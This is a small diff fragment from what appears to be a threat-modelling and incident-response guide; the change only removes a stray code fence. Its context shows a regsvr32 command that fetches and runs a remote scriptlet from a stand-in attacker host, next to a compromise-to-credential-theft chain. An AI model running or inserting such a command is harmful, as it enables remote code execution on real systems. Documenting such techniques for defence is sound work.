@@ -305,7 +305,6 @@ regsvr32 /s /n /u /i:https://cdn.attacker.com/stage.sct scrobj.dll
       SYSTEM COMPROMISE → CREDENTIAL THEFT
 ```
 
-```
 ## 11. Incident Response Workflow (Aligned to IR & Threat Modelling SOP)
 
 #Step 1 — Identify
